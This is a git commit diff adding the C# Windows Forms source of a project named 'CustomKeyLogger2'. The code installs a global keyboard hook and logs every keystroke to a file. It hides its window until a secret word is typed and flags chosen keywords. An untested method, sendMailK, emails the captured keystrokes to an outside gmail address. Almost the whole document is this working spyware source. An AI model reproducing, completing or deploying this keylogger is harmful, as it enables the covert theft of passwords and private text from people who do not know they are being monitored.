9a2d4cd78a3eb854a714c295332047b11e3555d8
@tM <aungthumoe5@gmail.com>
2011-01-04 14:49:57 +0800

    second commit, proj files

---
+++ CustomKeyLogger2/CustomKeyLogger2/Form1.Designer.cs
@@ -0,0 +1,209 @@
+﻿namespace CustomKeyLogger2
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.btnStart = new System.Windows.Forms.Button();
+            this.btnStop = new System.Windows.Forms.Button();
+            this.txtScrtWrd = new System.Windows.Forms.TextBox();
+            this.btnWrtTFl = new System.Windows.Forms.Button();
+            this.btnSvScrtWrd = new System.Windows.Forms.Button();
+            this.groupBox1 = new System.Windows.Forms.GroupBox();
+            this.btnShow = new System.Windows.Forms.Button();
+            this.txtLog = new System.Windows.Forms.TextBox();
+            this.groupBox2 = new System.Windows.Forms.GroupBox();
+            this.btnSaveKeyWord = new System.Windows.Forms.Button();
+            this.txtKeyWord = new System.Windows.Forms.TextBox();
+            this.btnHide = new System.Windows.Forms.Button();
+            this.groupBox1.SuspendLayout();
+            this.groupBox2.SuspendLayout();
+            this.SuspendLayout();
+            // 
+            // btnStart
+            // 
+            this.btnStart.Location = new System.Drawing.Point(12, 12);
+            this.btnStart.Name = "btnStart";
+            this.btnStart.Size = new System.Drawing.Size(75, 23);
+            this.btnStart.TabIndex = 0;
+            this.btnStart.Text = "Start";
+            this.btnStart.UseVisualStyleBackColor = true;
+            this.btnStart.Click += new System.EventHandler(this.btnStart_Click);
+            // 
+            // btnStop
+            // 
+            this.btnStop.Enabled = false;
+            this.btnStop.Location = new System.Drawing.Point(93, 12);
+            this.btnStop.Name = "btnStop";
+            this.btnStop.Size = new System.Drawing.Size(75, 23);
+            this.btnStop.TabIndex = 0;
+            this.btnStop.Text = "Stop";
+            this.btnStop.UseVisualStyleBackColor = true;
+            this.btnStop.Click += new System.EventHandler(this.btnStop_Click);
+            // 
+            // txtScrtWrd
+            // 
+            this.txtScrtWrd.Location = new System.Drawing.Point(6, 19);
+            this.txtScrtWrd.Name = "txtScrtWrd";
+            this.txtScrtWrd.Size = new System.Drawing.Size(83, 20);
+            this.txtScrtWrd.TabIndex = 1;
+            // 
+            // btnWrtTFl
+            // 
+            this.btnWrtTFl.Enabled = false;
+            this.btnWrtTFl.Location = new System.Drawing.Point(12, 41);
+            this.btnWrtTFl.Name = "btnWrtTFl";
+            this.btnWrtTFl.Size = new System.Drawing.Size(75, 23);
+            this.btnWrtTFl.TabIndex = 3;
+            this.btnWrtTFl.Text = "Write To File";
+            this.btnWrtTFl.UseVisualStyleBackColor = true;
+            this.btnWrtTFl.Click += new System.EventHandler(this.btnWrtTFl_Click);
+            // 
+            // btnSvScrtWrd
+            // 
+            this.btnSvScrtWrd.Location = new System.Drawing.Point(95, 17);
+            this.btnSvScrtWrd.Name = "btnSvScrtWrd";
+            this.btnSvScrtWrd.Size = new System.Drawing.Size(75, 23);
+            this.btnSvScrtWrd.TabIndex = 4;
+            this.btnSvScrtWrd.Text = "Save";
+            this.btnSvScrtWrd.UseVisualStyleBackColor = true;
+            this.btnSvScrtWrd.Click += new System.EventHandler(this.btnSvScrtWrd_Click);
+            // 
+            // groupBox1
+            // 
+            this.groupBox1.Controls.Add(this.btnSvScrtWrd);
+            this.groupBox1.Controls.Add(this.txtScrtWrd);
+            this.groupBox1.Location = new System.Drawing.Point(12, 70);
+            this.groupBox1.Name = "groupBox1";
+            this.groupBox1.Size = new System.Drawing.Size(178, 54);
+            this.groupBox1.TabIndex = 5;
+            this.groupBox1.TabStop = false;
+            this.groupBox1.Text = "Secret Word";
+            // 
+            // btnShow
+            // 
+            this.btnShow.Location = new System.Drawing.Point(93, 41);
+            this.btnShow.Name = "btnShow";
+            this.btnShow.Size = new System.Drawing.Size(75, 23);
+            this.btnShow.TabIndex = 5;
+            this.btnShow.Text = "Show";
+            this.btnShow.UseVisualStyleBackColor = true;
+            this.btnShow.Click += new System.EventHandler(this.btnShow_Click);
+            // 
+            // txtLog
+            // 
+            this.txtLog.Location = new System.Drawing.Point(196, 12);
+            this.txtLog.Multiline = true;
+            this.txtLog.Name = "txtLog";
+            this.txtLog.ReadOnly = true;
+            this.txtLog.ScrollBars = System.Windows.Forms.ScrollBars.Both;
+            this.txtLog.Size = new System.Drawing.Size(211, 172);
+            this.txtLog.TabIndex = 5;
+            // 
+            // groupBox2
+            // 
+            this.groupBox2.Controls.Add(this.btnSaveKeyWord);
+            this.groupBox2.Controls.Add(this.txtKeyWord);
+            this.groupBox2.Location = new System.Drawing.Point(12, 130);
+            this.groupBox2.Name = "groupBox2";
+            this.groupBox2.Size = new System.Drawing.Size(178, 54);
+            this.groupBox2.TabIndex = 6;
+            this.groupBox2.TabStop = false;
+            this.groupBox2.Text = "Key Word";
+            // 
+            // btnSaveKeyWord
+            // 
+            this.btnSaveKeyWord.Location = new System.Drawing.Point(95, 17);
+            this.btnSaveKeyWord.Name = "btnSaveKeyWord";
+            this.btnSaveKeyWord.Size = new System.Drawing.Size(75, 23);
+            this.btnSaveKeyWord.TabIndex = 4;
+            this.btnSaveKeyWord.Text = "Save";
+            this.btnSaveKeyWord.UseVisualStyleBackColor = true;
+            this.btnSaveKeyWord.Click += new System.EventHandler(this.btnSaveKeyWord_Click);
+            // 
+            // txtKeyWord
+            // 
+            this.txtKeyWord.Location = new System.Drawing.Point(6, 19);
+            this.txtKeyWord.Name = "txtKeyWord";
+            this.txtKeyWord.Size = new System.Drawing.Size(83, 20);
+            this.txtKeyWord.TabIndex = 1;
+            // 
+            // btnHide
+            // 
+            this.btnHide.Location = new System.Drawing.Point(12, 190);
+            this.btnHide.Name = "btnHide";
+            this.btnHide.Size = new System.Drawing.Size(28, 23);
+            this.btnHide.TabIndex = 7;
+            this.btnHide.Text = "X";
+            this.btnHide.UseVisualStyleBackColor = true;
+            this.btnHide.Click += new System.EventHandler(this.btnHide_Click);
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(419, 216);
+            this.ControlBox = false;
+            this.Controls.Add(this.btnHide);
+            this.Controls.Add(this.groupBox2);
+            this.Controls.Add(this.txtLog);
+            this.Controls.Add(this.btnShow);
+            this.Controls.Add(this.groupBox1);
+            this.Controls.Add(this.btnWrtTFl);
+            this.Controls.Add(this.btnStop);
+            this.Controls.Add(this.btnStart);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Form1";
+            this.Text = "Form1";
+            this.groupBox1.ResumeLayout(false);
+            this.groupBox1.PerformLayout();
+            this.groupBox2.ResumeLayout(false);
+            this.groupBox2.PerformLayout();
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button btnStart;
+        private System.Windows.Forms.Button btnStop;
+        private System.Windows.Forms.TextBox txtScrtWrd;
+        private System.Windows.Forms.Button btnWrtTFl;
+        private System.Windows.Forms.Button btnSvScrtWrd;
+        private System.Windows.Forms.GroupBox groupBox1;
+        private System.Windows.Forms.Button btnShow;
+        private System.Windows.Forms.TextBox txtLog;
+        private System.Windows.Forms.GroupBox groupBox2;
+        private System.Windows.Forms.Button btnSaveKeyWord;
+        private System.Windows.Forms.TextBox txtKeyWord;
+        private System.Windows.Forms.Button btnHide;
+    }
+}
+
---
+++ CustomKeyLogger2/CustomKeyLogger2/Form1.cs
@@ -0,0 +1,428 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.Linq;
+using System.Text;
+using System.Windows.Forms;
+
+using System.Runtime.InteropServices;
+using System.IO;
+using System.Collections;
+using System.Net.Mail;
+
+namespace CustomKeyLogger2
+{
+    public partial class Form1 : Form
+    {
+        string atmdir = Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().GetName().CodeBase);
+        string writeUp = "";
+        string secretWord = "";
+        ArrayList keyWords;
+
+        string secretFileDir;
+        string keywordsFileDir;
+        string logsFileDir;
+
+        public Form1()
+        {
+            InitializeComponent();
+            
+            InitStream();
+
+            InitSecretWord();
+
+            InitKeyWords();
+
+            writeUp = "";
+        }
+
+        private void InitStream()
+        {
+            atmdir = atmdir.Remove(0, 6);
+            atmdir += "\\";
+
+            secretFileDir = atmdir + "secret.krs";
+            keywordsFileDir = atmdir + "keywords.krs";
+            logsFileDir = atmdir + "logs.krs";
+            StreamWriter sw;
+            if (!File.Exists(secretFileDir))
+            {
+                sw = File.CreateText(secretFileDir);
+                sw.Close();
+            }
+            if (!File.Exists(keywordsFileDir))
+            {
+                sw = File.CreateText(keywordsFileDir);
+                sw.Close();
+            }
+            if (!File.Exists(logsFileDir))
+            {
+                sw = File.CreateText(logsFileDir);
+                sw.Close();
+            }
+        }
+
+        private void InitSecretWord()
+        {
+            using(StreamReader tr = new StreamReader(secretFileDir))
+            {
+                secretWord = tr.ReadLine();
+                if(secretWord == null) secretWord = "";
+            }
+
+            if (secretWord.CompareTo("") == 0)
+            {
+                this.ShowWindow();
+                this.btnStart.Enabled = true;
+                this.btnStop.Enabled = false;
+                this.btnHide.Enabled = false;
+            }
+            else
+            {
+                hook.CreateHook(KeyReaderr);
+                this.btnStart.Enabled = false;
+                this.btnStop.Enabled = true;
+                this.btnHide.Enabled = true;
+                this.HideWindow();
+            }
+        }
+
+        private void InitKeyWords()
+        {
+            using (StreamReader sr = new StreamReader(keywordsFileDir))
+            {
+                String temp;
+                keyWords = new ArrayList();
+
+                do
+                {
+                    // read a line of text
+                    temp = sr.ReadLine();
+                    if (temp != null) keyWords.Add(temp);
+                } while (temp != null);
+            }
+        }        
+
+        private void btnStart_Click(object sender, EventArgs e)
+        {
+            hook.CreateHook(KeyReaderr);
+            btnStart.Enabled = false;
+            btnStop.Enabled = true;
+            btnHide.Enabled = true;
+        }
+
+        private void btnStop_Click(object sender, EventArgs e)
+        {
+            hook.DestroyHook();
+            btnStart.Enabled = true;
+            btnStop.Enabled = false;
+            btnHide.Enabled = false;
+        }
+
+        public void KeyReaderr(IntPtr wParam, IntPtr lParam)
+        {
+            int key = Marshal.ReadInt32(lParam);
+
+            hook.VK vk = (hook.VK)key;
+
+            String temp = "";
+
+            switch (vk)
+            {
+                case hook.VK.VK_F1: temp = "<-F1->";
+                    break;
+                case hook.VK.VK_F2: temp = "<-F2->";
+                    break;
+                case hook.VK.VK_F3: temp = "<-F3->";
+                    break;
+                case hook.VK.VK_F4: temp = "<-F4->";
+                    break;
+                case hook.VK.VK_F5: temp = "<-F5->";
+                    break;
+                case hook.VK.VK_F6: temp = "<-F6->";
+                    break;
+                case hook.VK.VK_F7: temp = "<-F7->";
+                    break;
+                case hook.VK.VK_F8: temp = "<-F8->";
+                    break;
+                case hook.VK.VK_F9: temp = "<-F9->";
+                    break;
+                case hook.VK.VK_F10: temp = "<-F10->";
+                    break;
+                case hook.VK.VK_F11: temp = "<-F11->";
+                    break;
+                case hook.VK.VK_F12: temp = "<-F12->";
+                    break;
+                case hook.VK.VK_NUMLOCK: temp = "<-numlock->";
+                    break;
+                //case hook.VK.VK_SCROLL: temp = "<-scroll>";
+                //    break;
+                case hook.VK.VK_LSHIFT: temp = "<-left shift->";
+                    break;
+                case hook.VK.VK_RSHIFT: temp = "<-right shift->";
+                    break;
+                case hook.VK.VK_LCONTROL: temp = "<-left control->";
+                    break;
+                case hook.VK.VK_RCONTROL: temp = "<-right control->";
+                    break;
+                case hook.VK.VK_SEPERATOR: temp = "|";
+                    break;
+                case hook.VK.VK_SUBTRACT: temp = "-";
+                    break;
+                case hook.VK.VK_DECIMAL: temp = ".";
+                    break;
+                case hook.VK.VK_DIVIDE: temp = "/";
+                    break;
+                case hook.VK.VK_NUMPAD0: temp = "0";
+                    break;
+                case hook.VK.VK_NUMPAD1: temp = "1";
+                    break;
+                case hook.VK.VK_NUMPAD2: temp = "2";
+                    break;
+                case hook.VK.VK_NUMPAD3: temp = "3";
+                    break;
+                case hook.VK.VK_NUMPAD4: temp = "4";
+                    break;
+                case hook.VK.VK_NUMPAD5: temp = "5";
+                    break;
+                case hook.VK.VK_NUMPAD6: temp = "6";
+                    break;
+                case hook.VK.VK_NUMPAD7: temp = "7";
+                    break;
+                case hook.VK.VK_NUMPAD8: temp = "8";
+                    break;
+                case hook.VK.VK_NUMPAD9: temp = "9";
+                    break;
+                case hook.VK.VK_Q: temp = "q";
+                    break;
+                case hook.VK.VK_W: temp = "w";
+                    break;
+                case hook.VK.VK_E: temp = "e";
+                    break;
+                case hook.VK.VK_R: temp = "r";
+                    break;
+                case hook.VK.VK_T: temp = "t";
+                    break;
+                case hook.VK.VK_Y: temp = "y";
+                    break;
+                case hook.VK.VK_U: temp = "u";
+                    break;
+                case hook.VK.VK_I: temp = "i";
+                    break;
+                case hook.VK.VK_O: temp = "o";
+                    break;
+                case hook.VK.VK_P: temp = "p";
+                    break;
+                case hook.VK.VK_A: temp = "a";
+                    break;
+                case hook.VK.VK_S: temp = "s";
+                    break;
+                case hook.VK.VK_D: temp = "d";
+                    break;
+                case hook.VK.VK_F: temp = "f";
+                    break;
+                case hook.VK.VK_G: temp = "g";
+                    break;
+                case hook.VK.VK_H: temp = "h";
+                    break;
+                case hook.VK.VK_J: temp = "j";
+                    break;
+                case hook.VK.VK_K: temp = "k";
+                    break;
+                case hook.VK.VK_L: temp = "l";
+                    break;
+                case hook.VK.VK_Z: temp = "z";
+                    break;
+                case hook.VK.VK_X: temp = "x";
+                    break;
+                case hook.VK.VK_C: temp = "c";
+                    break;
+                case hook.VK.VK_V: temp = "v";
+                    break;
+                case hook.VK.VK_B: temp = "b";
+                    break;
+                case hook.VK.VK_N: temp = "n";
+                    break;
+                case hook.VK.VK_M: temp = "m";
+                    break;
+                case hook.VK.VK_0: temp = "0";
+                    break;
+                case hook.VK.VK_1: temp = "1";
+                    break;
+                case hook.VK.VK_2: temp = "2";
+                    break;
+                case hook.VK.VK_3: temp = "3";
+                    break;
+                case hook.VK.VK_4: temp = "4";
+                    break;
+                case hook.VK.VK_5: temp = "5";
+                    break;
+                case hook.VK.VK_6: temp = "6";
+                    break;
+                case hook.VK.VK_7: temp = "7";
+                    break;
+                case hook.VK.VK_8: temp = "8";
+                    break;
+                case hook.VK.VK_9: temp = "9";
+                    break;
+                //case hook.VK.VK_SNAPSHOT: temp = "<-print screen->";
+                //    break;
+                case hook.VK.VK_INSERT: temp = "<-insert->";
+                    break;
+                case hook.VK.VK_DELETE: temp = "<-delete->";
+                    break;
+                case hook.VK.VK_BACK: temp = "<-backspace->";
+                    break;
+                case hook.VK.VK_TAB: temp = "<-tab->";
+                    break;
+                case hook.VK.VK_RETURN: temp = "<-enter->";
+                    break;
+                //case hook.VK.VK_PAUSE: temp = "<-pause->";
+                //    break;
+                case hook.VK.VK_CAPITAL: temp = "<-caps lock->";
+                    break;
+                //case hook.VK.VK_ESCAPE: temp = "<-esc->";
+                //    break;
+                case hook.VK.VK_SPACE: temp = "<-space->";
+                    break;
+                //case hook.VK.VK_PRIOR: temp = "<-page up->";
+                //    break;
+                //case hook.VK.VK_NEXT: temp = "<-page down->";
+                //    break;
+                //case hook.VK.VK_END: temp = "<-end->";
+                //    break;
+                //case hook.VK.VK_HOME: temp = "<-home->";
+                //    break;
+                case hook.VK.VK_LEFT: temp = "<-arrow left->";
+                    break;
+                case hook.VK.VK_UP: temp = "<-arrow up->";
+                    break;
+                case hook.VK.VK_RIGHT: temp = "<-arrow right->";
+                    break;
+                case hook.VK.VK_DOWN: temp = "<-arrow down->";
+                    break;
+                default: break;
+            }
+
+            writeUp = writeUp + temp;
+
+            unhide();
+            checkKeys();
+            writeToFile(temp);
+        }
+
+        public void unhide()
+        {
+            if (writeUp.Contains(secretWord) && secretWord != "")
+            {
+                writeUp = writeUp.Replace(secretWord,"");
+                this.ShowWindow();
+            }
+        }
+
+        public void checkKeys()
+        {
+            int max = keyWords.Count;
+
+            for (int i = 0; i < max; i++)
+            {
+                if (writeUp.Contains((String)keyWords[i]))
+                {
+                    MessageBox.Show("KeyWord!");
+                    MessageBox.Show((String)keyWords[i]);
+
+                    writeUp = writeUp.Replace((String)keyWords[i],"");
+                    return;
+                }
+            }
+
+        }
+
+        public void writeToFile(String writing)
+        {
+            File.AppendAllText(logsFileDir, writing);
+        }
+
+        private void btnWrtTFl_Click(object sender, EventArgs e)
+        {
+            writeToFile(writeUp);
+            writeUp = "";
+        }
+
+        private void btnShow_Click(object sender, EventArgs e)
+        {
+            txtLog.Text = File.ReadAllText(logsFileDir);
+        }
+
+        private void btnSvScrtWrd_Click(object sender, EventArgs e)
+        {
+            WriteSecretWord();
+        }
+
+        private void WriteSecretWord()
+        {
+            File.Delete(secretFileDir);
+            using (StreamWriter sw = File.CreateText(secretFileDir))
+            {
+                sw.Write(txtScrtWrd.Text.Trim());
+            }
+            secretWord = txtScrtWrd.Text.Trim();
+        }
+
+        private void btnSaveKeyWord_Click(object sender, EventArgs e)
+        {
+            String input = txtKeyWord.Text.Trim();
+            if (CheckDuplicateKeyWords(input)) return;
+
+            keyWords.Add(input);
+            using (StreamWriter sw = new StreamWriter(keywordsFileDir))
+            {
+                sw.WriteLine(input);
+            }
+        }
+
+        private bool CheckDuplicateKeyWords(string input)
+        {
+            bool result = false;
+            int max = keyWords.Count;
+            for (int i = 0; i < max; i++)
+            {
+                if ((String)keyWords[i] == input) result = true;
+            }
+            return result;
+        }
+
+        public void sendMailK() // not tested
+        {
+            MailMessage message = new MailMessage("keylogger", "arxleol@gmail.com", "keyword fired", writeUp);
+            SmtpClient emailClient = new SmtpClient("either local host or google smtp or soemthing third");
+            System.Net.NetworkCredential SMTPUserInfo = new System.Net.NetworkCredential("your username", "your password");
+            emailClient.UseDefaultCredentials = false;
+            emailClient.Credentials = SMTPUserInfo;
+            emailClient.Send(message);
+        }
+
+        private void btnHide_Click(object sender, EventArgs e)
+        {
+            this.HideWindow();
+        }
+
+        private void ShowWindow()
+        {
+            this.Opacity = 1;
+            this.ShowInTaskbar = true;
+            this.WindowState = FormWindowState.Normal;
+            this.Refresh();
+        }
+
+        private void HideWindow()
+        {
+            this.Opacity = 0;
+            this.ShowInTaskbar = false;
+            this.WindowState = FormWindowState.Minimized;
+            this.Refresh();
+        }
+    }
+}
